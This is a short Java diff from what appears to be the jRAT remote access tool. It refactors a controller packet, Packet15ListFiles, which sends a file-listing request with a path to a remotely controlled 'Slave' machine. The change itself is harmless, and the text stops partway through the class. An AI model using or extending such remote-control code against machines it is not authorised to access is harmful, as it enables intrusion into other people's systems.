@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 
-public class Packet15ListFiles extends AbstractOutgoingPacket {
+public class Packet15ListFiles implements OutgoingPacket {
 
 	private String path;
 
